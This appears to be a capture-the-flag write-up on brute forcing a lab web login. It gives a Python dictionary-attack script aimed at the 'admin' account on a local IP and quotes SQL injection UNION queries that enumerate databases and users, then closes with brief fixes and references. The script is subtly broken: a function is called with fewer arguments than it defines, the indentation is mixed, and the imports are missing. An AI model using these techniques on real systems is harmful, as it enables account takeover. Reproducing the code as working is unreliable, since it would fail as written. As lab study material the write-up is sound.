# Brute force login

### Introduction
Brute forcing involves attempting multiple combinations of passwords for a specific user until the correct password is discovered, granting access to the user's account.

### Procedure
Numerous brute force techniques exist, and our focus lies on the dictionary attack. This method involves systematically testing a list of potential passwords one by one until the correct password is successfully identified.

To accomplish this, we have created a small Python program, `brute_force.py`, which attempts to authenticate to the `admin` account by testing passwords from a dictionary named `dictionary.txt`. This dictionary contains the most popular passwords used by users in 2014.

### Program
We first starts by converting the lines of our dictionary into a list. This will allow us to successively trying each password from our list. 
```` python
def read_file(path: str):
	with open(path, 'r') as file:
		lines = []

		for line in file:
			lines.append(line.strip())

	return lines
````

Then, for each password in that list, we send a request to the server with the username `admin` using the function `try_authentication`. Every time we attempt an incorrect password, the server responds with a specific page. By recognizing this pattern, we can determine the correctness of a password based on the presence of the word `flag` in the response page. Therefore, if a response contains the word `flag`, we know the password is correct.
``` python
def try_authentication(wrong_request_length: int, username: str, password: str):
  print(f"[username: {username}] [password: {password}] => ", end="", flush=True)
  params = {
		'page': 'signin',
		'username': username,
		'password': password,
		'Login': 'Login'
	}

	encoded_params = urllib.parse.urlencode(params)

	url = 'http://192.168.56.2/?{}'.format(encoded_params)

	response = requests.get(url)
	success = response.text.find('flag') != -1
	print(success)

	return success, response.text
```

We use the username `admin` after discovering it during the `sql_injection_members` phase. Initially, we ran the query `1 UNION SELECT schema_name, 1 FROM information_schema.schemata;` to obtain a list of available databases. Subsequently, we executed `1 UNION SELECT username, 1 FROM Member_Brute_Force.db_default;` to retrieve a list of accessible users. Upon discovering the correct password, we printed the response containing the sought-after flag.
```python
def main():
  try:
    assert len(sys.argv) == 2, "IP address is not valid."

    print("=== Brute forcing website ===")
    username = "admin"
    file = "dictionary.txt"
    passwords = read_file(file)

    for password in passwords:
      success, response = try_authentication(username, password)

      if success:
        print(response)
        return

    print(f"Password for username {username} is not in list.")
  except Exception as err:
    print(f'Error: {err}')
```

### How to fix
It is important for the service to compel users to select a strong password, safeguard the server from sending requests beyond the website by employing tokens, and implement measures to temporarily block IP addresses after a certain number of authentication attempts.

### Sources
[Wikipedia - Brute-force attack](https://en.wikipedia.org/wiki/Brute-force_attack)

[Wikipedia - List of the most common passwords](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords)

[OWASP - Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)

[OWASP - Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)

[MySQL - The INFORMATION_SCHEMA SCHEMATA Table](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)